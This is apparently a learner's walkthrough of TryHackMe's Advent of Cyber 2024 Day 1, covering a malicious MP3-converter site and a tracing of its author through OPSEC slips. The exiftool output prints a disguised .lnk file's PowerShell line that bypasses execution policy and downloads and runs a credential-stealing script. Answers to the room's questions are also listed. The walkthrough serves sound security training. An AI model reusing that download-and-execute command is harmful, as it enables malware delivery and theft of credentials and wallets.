<h5 align="center">December 1, 2024<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{209}}$$-day-streak in  <a href="https://tryhackme.com/">TryHackMe</a>.</h5>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Advent of Cyber 2024}}$$</h1>

<h5 align="center">Dive into the wonderful world of cyber security by engaging<br>
in festive beginner-friendly exercises every day in the lead-up to Christmas!</h5>

<p align="center">
<img height="90px" hspace="20" src="https://github.com/user-attachments/assets/0d8d7f29-525a-49ad-85ba-9223bdec089b">
<img width="500px" src="https://github.com/user-attachments/assets/8ca4206f-a1e7-48d8-ba17-d8e304613a2c"></p>

<p align="center">Access this 🆓 TryHackMe CTF challenge clicking <a href="https://tryhackme.com/r/room/adventofcyber2024">Advent of Cyber 2024</a>.</p>

<h2 align="center"> $$\textcolor{yellow}{\textnormal{Day 1 - OPSEC}}$$<br>
$$\textcolor{yellow}{\textnormal{Maybe SOC-mas music, he thought, doesn't come from a store?}}$$</h2>

<p align="center"><img width="900px" src="https://github.com/user-attachments/assets/d02fbb62-4680-46c6-b7e4-48308275a0cc"></p>

<p><em>McSkidy tapped keys with a confident grin,<br>
A suspicious website, now where to begin?<br>
She'd seen sites like this, full of code and of grime,<br>
Shady domains, and breadcrumbs easy to find.</em></p>

<br>
<br>

<p>McSkidy's fingers flew across the keyboard, her eyes narrowing at the suspicious website on her screen. She had seen dozens of malware campaigns like this. This time, the trail led straight to someone who went by the name "Glitch."<br>

"Too easy," she muttered with a smirk.<br>

"I still have time," she said, leaning closer to the screen. "Maybe there's more."<br>

Little did she know, beneath the surface lay something far more complex than a simple hacker's handle. This was just the beginning of a tangled web unravelling everything she thought she knew.</p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/a8dc2b40-c3ae-4a6f-94ba-060d705b94f0"></p>

<h3>Learning Objectives</h3>
<ul style="list-style-type:square">
    <li>Learn how to investigate malicious link files.</li>
    <li>Learn about OPSEC and OPSEC mistakes.</li>
    <li>Understand how to track and attribute digital identities in cyber investigations.</li>
</ul></p>

<br>
<h3>Connecting to the Machine</h3>
<p>Before moving forward, review the questions in the connection card shown below and start the virtual machine by pressing the <code>Sart Machine</code> button. The VM should be fully loaded in 3 minutes. Additionally, you will need the AttackBox, which can be launched by clicking the <code>Strat AttakBox</code> button at the top of the page.</p>

<h5>NOTE:</h5>
<p>If you’re clicking "Start Machine" and encountering an issue launching it, don’t worry—it’s just the high demand. What can you do?</p>
<ul style="list-style-type:square">
    <li>Keep trying! Machines are becoming available as demand fluctuates.</li>
    <li>If you’re still having trouble, come back a little later when it’s less busy.</li>
</ul></p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/e35c0bcc-0716-4909-94ee-7201728e4457"></p>

<br>
<h3>Investigating the Website</h3>
<p>The website we are investigating is a <code>Youtube to MP3 converter</code>code> currently being shared amongst the organizers of SOC-mas. You've decided to dig deeper after hearing some concerning reports about this website.</p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/1978784b-55a6-4c86-bb6b-04c212e37615"></p>

<p>From your AttackBox, access the website by visiting <code>MACHINE_IP</code> using the web browser.<br>

At first glance, the website looks legit and presentable. The About Page even says that it was made by "The Glitch ". How considerate of them to make our job easier!<br>

Scrolling down, you'll see the feature list, which promises to be "Secure" and "Safe." From our experience, that isn't very likely.</p>

<br>
<h3>Youtube to MP3 Converter Websites</h3>
<p>These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:</p>
<ul style="list-style-type:square">
    <li><strong>Malvertising</strong>: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.</li>
    <li><strong>Phishing scams</strong>: Users can be tricked into providing personal or sensitive information via fake surveys or offers.</li>
    <li><strong>Bundled malware</strong>: Some converters may come with malware, tricking users into unknowingly running it..</li>
</ul></p>

<p>What nefarious thing does this website have in store for us?</p>

<br>
<h3>Getting Some Tunes</h3>
<p>Let's find out by pasting any YouTube link in the search form and pressing the "Convert" button. Then select either <code>mp3 or mp4</code> option. This should download a file that we could use to investigate. For example, we can use <code>https://www.youtube.com/watch?v=dQw4w9WgXcQ</code>, a classic if you ask me.<br>

Once downloaded, navigate to your Downloads folder or if you are using the AttackBox, to your /root/ directory. Locate the file named <code>download.zip</code>, right-click on it, and select <code>Extract To</code>. In the dialog window, click the <code>Extract</code> button to complete the extraction.</p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/e5c65d7b-6d5e-4965-b98f-7955f9ffb101"></p>

<p>You'll now see two extracted two files: <code>song.mp3</code> and <code>somg.mp3</code>.<br>

To quickly determine the file's contents, double-click on the "Terminal" icon on the desktop then run the <code>file</code> command on each one. First, let's try checking <code>song.mp3</code>.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/14dff988-1c51-4cba-b4c1-c6498cd1f232"></p>

<p>There doesn't seem to be anything suspicious, according to the output. As expected, this is just an MP3 file.<br>

How about the second file <code>somg.mp3</code>? From the filename alone, we can tell something is not right. Still, let's confirm by running the <code>file</code> command on it anyway.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/98a421a7-f468-4bdb-bdea-654284f87718"></p>

<p>Now, this is more interesting!

The output tells us that instead of an MP3, the file is an "MS Windows shortcut", also known as a <code>.lnk</code> file. This file type is used in Windows to link to another file, folder, or application. These shortcuts can also be used to run commands! If you've ever seen the shortcuts on a Windows desktop, you already know what they are.<br>

There are multiple ways to inspect <code>.lnk</code>  files to reveal the embedded commands and attributes. For this room, however, we'll use <code>ExifTool</code>, which is already installed on this machine.<br>

To do this, go back to your Terminal and type:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/6363a001-477b-4101-8c8f-7650f770dbf1"></p>

<p>Look through the output to locate the command used as a shortcut in the <code>somg.mp3</code> file. If you scroll down through the output, you should see a PowerShell command.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/2030d438-81cd-464e-9b42-1813006f3974"></p>

<p>What this PowerShell command does:</p>
<ul style="list-style-type:square">
    <li>The <code>-ep Bypass -nop</code> flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.</li>
    <li>The <code>DownloadFile</code> method pulls a file (in this case, <code>IS.ps1</code>) from a remote server (<code>https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1</code>) and saves it in the <code>C:\\ProgramData\\</code> directory on the target machine.</li>
    <li>Once downloaded, the script is executed with PowerShell using the <code>iex</code> command, which triggers the downloaded <code>s.ps1</code> file</li>
</ul></p>

<p>If you visit the contents of the file to be downloaded using your browser<br>
(<code>https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1</code>), you will see just how lucky we are that we are not currently using Windows.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/fe8281dd-335c-4e39-b559-056f5ffc86b1"></p>

<p>The script is designed to collect highly sensitive information from the victim's system, such as cryptocurrency wallets and saved browser credentials, and send it to an attacker's remote server.</p>

<p><em><strong>Disclaimer</strong>: All content in this room, including CPP code, PowerShell scripts, and commands, is provided solely for educational purposes. Please do not execute these on a Windows host.</em></p>

<p>This looks fairly typical of a PowerShell script for such a purpose, with one notable exception: a signature in the code that reads.</p>

<h5><strong>Created by the one and only M.M.</strong></h5>

<br>
<h3>Searching the Source</h3>
<p>There are many paths we could take to continue our investigation. We could investigate the website further, analyse its source code, or search for open directories that might reveal more information about the malicious actor's setup. We can search for the hash or signature on public malware databases like VirusTotal or Any.Run. Each of these methods could yield useful clues.<br>

However, for this room, we'll try something a bit different. Since we already have the PowerShell code, searching for it online might give us useful leads. It's a long shot, but we'll explore it in this exercise.<br>

There are many places where we can search for code. The most widely used is Github. So let's try searching there.<br>

To search effectively, we can look for unique parts of the code that we could use to search with. The more distinctive, the better. For this scenario, we have the string we've uncovered before that reads:</p>

<h5><strong>"Created by the one and only M.M."</strong></h5>

<p>Search for this on Github.com or by going directly to this link:<br>
<code>https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues</code></p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/0b5858ec-0990-40a2-8f4f-7a344cdc20a8"></p>

<p>You'll notice something interesting if you explore the pages in the search results.</p>

<br>
<h3>Note!</h3>
<p>If you receive an error below, it's because Github has rate limits in place if you are not signed in. To fix this, you can just sign in with a GitHub account or skip directly to the next step by going here:<br>
<code>https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1</code></p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/1a53f19b-0ff2-46ea-8683-0cbe4a162a4a"></p>

<p>If you look through the search results, you can be able infer the malicious actor's identity based on information on the project's page and the GitHub Issues section.</p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/7de335ac-3a3c-4a21-86f3-63ac664ec21c"></p>

<p>Aha! Looks like this user has made a critical mistake.</p>

<br>
<h3>Introduction to OPSEC</h3>
<p>This is a classic case of OPSEC failure.<br>

Operational Security (OPSEC) is a term originally coined in the military to refer to the process of protecting sensitive information and operations from adversaries. The goal is to identify and eliminate potential vulnerabilities before the attacker can learn their identity.<br>

In the context of cyber security, when malicious actors fail to follow proper OPSEC practices, they might leave digital traces that can be pieced together to reveal their identity. Some common OPSEC mistakes include:</p>

<ul style="list-style-type:square">
    <li>Reusing usernames, email addresses, or account handles across multiple platforms. One might assume that anyone trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.</li>
    <li>Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.</li>
    <li>Posting publicly on forums or GitHub (Like in this current scenario) with details that tie back to their real identity or reveal their location or habits.</li>
    <li>Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.</li>
</ul></p>

<p>You'd think that someone doing something bad would make OPSEc their top priority, but they're only human and can make mistakes, too.<br>

For example, here are some real-world OPSEC mistakes that led to some really big fails:</p>

<br>
<h3>AlphaBay Admin Takedown</h3>
<p>One of the most spectacular OPSEC failures involved Alexandre Cazes, the administrator of AlphaBay, one of the largest dark web marketplaces:

<ul style="list-style-type:square">
    <li>Cazes used the email address "pimp_alex_91@hotmail.com" in early welcome emails from the site.</li>
    <li>This email included his year of birth and other identifying information.</li>
    <li>He cashed out using a Bitcoin account tied to his real name.</li>
    <li>Cazes reused the username "Alpha02" across multiple platforms, linking his dark web identity to forum posts under his real name.</li>
</ul></p>

<br>
<h3>Chinese Military Hacking Group (APT1)</h3>
<p>There's also the notorious Chinese hacking group APT1, which made several OPSEC blunders:
<ul style="list-style-type:square">
    <li>One member, Wang Dong, signed his malware code with the nickname "Ugly Gorilla"..</li>
    <li>This nickname was linked to programming forum posts associated with his real name.</li>
    <li>The group used predictable naming conventions for users, code, and passwords.</li>
    <li>Their activity consistently aligned with Beijing business hours, making their location obvious.</li>
</ul></p>

<p>These failures provided enough information for cyber security researchers and law enforcement to publicly identify group members.</p>

<br>
<h3>Uncovering MM</h3>
<p>If you've thoroughly investigated the GitHub search result, you should have uncovered several clues based on poor OPSEC practices by the malicious actor.<br>

We know the attacker left a distinctive signature in the PowerShell code (MM). This allowed us to search for related repositories and issues pages on GitHub. We then discovered an Issues page where the attacker engaged in discussions, providing more context and linking their activity to other projects.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/8ae66610-1629-4548-8caa-3281e81f53fc"></p>

<p>In this discussion, they responded to a query about modifying the code. This response, paired with their unique handle, was another critical slip-up, leaving behind a trail of evidence that can be traced back to them. By analysing the timestamps, usernames, and the nature of their interactions, we can now attribute the mastermind behind the attack to MM.</p>

<br>
<h3>Whats Next?</h3>
<p><em>McSkidy dug deeper, her mind sharp and quick,<br>
But something felt off, a peculiar trick.<br>
The pieces she’d gathered just didn’t align,<br>
A puzzle with gaps, a tangled design.</em></p>

<br>


<p>As McSkidy continued digging, a pattern emerged that didn't fit the persona she was piecing together. A different handle appeared in obscure places, buried deep in the details: "MM."<br>

"Who's MM?" McSkidy muttered, the mystery deepening.<br>

Even though all signs on the website seemed to point to Glitch as the author, it became clear that someone had gone to great lengths to ensure Glitch's name appeared everywhere. Yet, the scattered traces left by MM suggested a deliberate effort to shift the blame.</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 1.1. <em>Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?</em><br><a id='1.1'></a>
>> <code><strong>Tyler Ramsbey</strong></code>

<br>

> 1.2. <em>The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?</em><br><a id='1.2'></a>
>> <code><strong>http://papash3ll.thm/data</strong></code>

<br>


> 1.3. <em>Who is M.M? Maybe his Github profile page would provide clues?</em><br><a id='1.3'></a>
>> <code><strong>Mayor Malware</strong></code>

<br>

> 1.4. <em>What is the number of commits on the GitHub repo where the issue was raised?</em><br><a id='1.4'></a>
>> <code><strong>1</strong></code>

<br>

> 1.5. <em>If you enjoyed this task, feel free to check out the OPSEC room!</em><br><a id='1.5'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 1.6. <em>What's with all these GitHub repos? Could they hide something else?</em><br><a id='1.6'></a>
>> <code><strong>No answer needed</strong></code>

<br>


<p>Investigating the website</p>

![image](https://github.com/user-attachments/assets/1b76e741-ac59-4ca8-a230-8f6d05b370a8)

<br>

![image](https://github.com/user-attachments/assets/28940d01-7799-443c-9ee2-c09297060a54)

<br>

![image](https://github.com/user-attachments/assets/42b01785-f2aa-4db6-a2d0-e884351a406c)

<br>

<p>Entered the provided Youtube link to convert into MP3.</p>


![image](https://github.com/user-attachments/assets/a5aa2805-8689-42fe-b6c7-d034e6f5e715)

<br>

![image](https://github.com/user-attachments/assets/c615ca63-9204-4fb5-abe4-2c486fb5c1fd)

<br>

![image](https://github.com/user-attachments/assets/d1c8321f-abc2-4d21-b40a-d4c4d58420b5)

<br>

<p>Downloaded the converted file.</p>

![image](https://github.com/user-attachments/assets/c466d234-968f-4e0f-bfa2-82a44f2976fb)

<br>

![image](https://github.com/user-attachments/assets/bb95a9b6-816e-4cf7-aa0c-be880fd11315)

<br>

![image](https://github.com/user-attachments/assets/41e1cae6-4856-4e27-b54e-90f69bf4d47b)

<br>
<p>Analyzed file type.</p>

![image](https://github.com/user-attachments/assets/963385c8-62c9-449c-b24e-6d644752d647)

<br>

<p>Employed <code>exiftool</code> to get information of each one of the two files.file type.</p>

<br>

<pre><code>root@ip-[THM AttackBox]:~/Day1# exiftool song.mp3
ExifTool Version Number         : 11.88
File Name                       : song.mp3
Directory                       : .
File Size                       : 4.4 MB
File Modification Date/Time     : 2024:10:24 10:50:46+01:00
File Access Date/Time           : 2024:12:01 18:26:49+00:00
File Inode Change Date/Time     : 2024:12:01 18:24:32+00:00
File Permissions                : rwxr-xr-x
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 192 kbps
Sample Rate                     : 44100
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 2176
Artist                          : Tyler Ramsbey
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
</code></pre>

<br>

<pre><code>root@ip-[THM AttackBox]:~/Day1# exiftool somg.mp3
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.1 kB
File Modification Date/Time     : 2024:10:30 14:32:52+00:00
File Access Date/Time           : 2024:12:01 18:26:59+00:00
File Inode Change Date/Time     : 2024:12:01 18:24:32+00:00
File Permissions                : rw-r--r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 08:14:14+01:00
Access Date                     : 2018:09:15 08:14:14+01:00
Modify Date                     : 2018:09:15 08:14:14+01:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
</code></pre>

<br>
<p>I accessed the following link provided in the tutorial.</p>

<pre><code>https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1</code></pre>

<br>
<p>and got this ...</p>

![image](https://github.com/user-attachments/assets/8133dd4e-ad47-4621-9057-1e3ef2612f95)

<br>

<p>Then I accessed the link below, also provided in the tutorial.  The objective is investigate M.M.</p>

<pre><code>https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues</code></pre>

<p>and got this ...</p>

![image](https://github.com/user-attachments/assets/069a3c51-1b61-4b17-9d7a-2a88120d855f)

<br>

<p>After clicking on the second link of the previous webpage, I noticed a conversation between <code>MM-WarevilleTHM</code> and <code>Bloatware-WarevilleTHM</code></p>


![image](https://github.com/user-attachments/assets/a10ae21b-4a24-4d27-b354-3468fed3fcf2)

<br>

<p>Here I discover who is M.M. ...</p>

![image](https://github.com/user-attachments/assets/c91bb786-2e16-4f68-9ec6-7ee06e9c2fe9)


<br>

<p>M.M. has 2 repositories: <code>IS</code> and <code>M.M.</code>, and joined GitHub on October 22, 2024.</p>

![image](https://github.com/user-attachments/assets/95d2e62b-b3ba-4877-a3a4-a33734ea418c)

<br>

![image](https://github.com/user-attachments/assets/1760cdf4-c449-484b-8d7b-75108c020896)

<br>

<p>Next I identified the number of commits on the GitHub repo where the issue was raised, which is <code>IS</code></p>

![image](https://github.com/user-attachments/assets/a329c13e-af37-4b82-8550-b2e756c702a3)

<br>

<p>Reviewing <code>IP.ps1</code> we can identify what is the C2 server.</p>

![image](https://github.com/user-attachments/assets/e6b1b6b8-522e-492f-a4c6-14f40e106e8e)


<br>

<h2>Task Complete<a id='2'></a></h2>
<p>Keep learning, keep growing!<br>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/08b03051-5594-4ea3-a843-43f3d21904a6"> </h3>

<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 1, 2024  | 209      |      1,061st |         23rd |     3,144th |       46th | 58,514   |       448 |

</div>


<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/e590e88e-febe-468a-914d-033235e994fb"> </h3>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
